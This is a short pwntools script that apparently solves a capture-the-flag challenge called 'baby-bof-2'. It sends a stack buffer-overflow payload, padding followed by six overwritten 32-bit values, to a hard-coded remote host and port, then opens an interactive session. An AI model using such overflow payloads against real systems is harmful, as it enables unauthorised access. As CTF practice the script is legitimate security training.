from pwn import *

e = ELF("./baby-bof-2")
context.binary = e

r = remote("35.240.148.138",5002)
#r = process([e.path])

r.sendline(b'A'*100+p32(0xffff)+p32(0xeeee)+p32(0xdddd)+p32(0xcccc)+p32(0xbbbb)+p32(0xaaaa)+b'A'*10)
r.interactive()